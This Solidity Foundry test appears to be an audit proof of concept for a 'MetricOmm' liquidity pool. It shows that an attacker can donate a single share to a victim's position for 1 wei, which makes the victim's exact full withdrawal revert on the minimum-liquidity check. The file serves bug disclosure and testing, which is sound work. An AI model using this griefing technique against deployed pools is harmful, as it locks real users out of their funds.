// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolLiquidityAdderTest} from "./MetricOmmPoolLiquidityAdder.t.sol";
import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";

contract ShareDonationWithdrawalDoSAuditTest is MetricOmmPoolLiquidityAdderTest {
  uint80 internal constant SALT = 91;
  int8 internal constant BIN = 4;

  function test_realAdderLetsAttackerInvalidateEOAFullWithdrawal() public {
    // Alice creates the smallest valid EOA-owned position through the production helper.
    vm.prank(alice);
    helper.addLiquidityExactShares(
      address(pool), alice, SALT, _deltaAbovePrice(BIN, MINIMAL_MINTABLE_LIQUIDITY),
      type(uint256).max, type(uint256).max, ""
    );

    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);
    vm.startPrank(attacker);
    weth.deposit{value: 1 ether}();
    weth.approve(address(helper), type(uint256).max);

    uint256 attackerBalanceBefore = weth.balanceOf(attacker);
    helper.addLiquidityExactShares(
      address(pool), alice, SALT, _deltaAbovePrice(BIN, 1),
      type(uint256).max, type(uint256).max, ""
    );
    vm.stopPrank();

    // Alice's signed full-withdrawal amount is now stale by one share. Burning it
    // would leave one share, so the anti-dust check reverts the entire withdrawal.
    vm.prank(alice);
    vm.expectRevert(
      abi.encodeWithSelector(
        IMetricOmmPoolActions.MinimalLiquidity.selector, 1, MINIMAL_MINTABLE_LIQUIDITY
      )
    );
    pool.removeLiquidity(
      alice, SALT, _deltaAbovePrice(BIN, MINIMAL_MINTABLE_LIQUIDITY), ""
    );

    uint256 attackerCost = attackerBalanceBefore - weth.balanceOf(attacker);
    emit log_named_uint("attacker WETH cost (raw units)", attackerCost);
    emit log_named_uint(
      "alice shares after blocked withdrawal",
      stateView.positionBinShares(address(pool), alice, SALT, BIN)
    );

    assertEq(attackerCost, 1);
    assertEq(
      stateView.positionBinShares(address(pool), alice, SALT, BIN),
      MINIMAL_MINTABLE_LIQUIDITY + 1
    );
  }
}
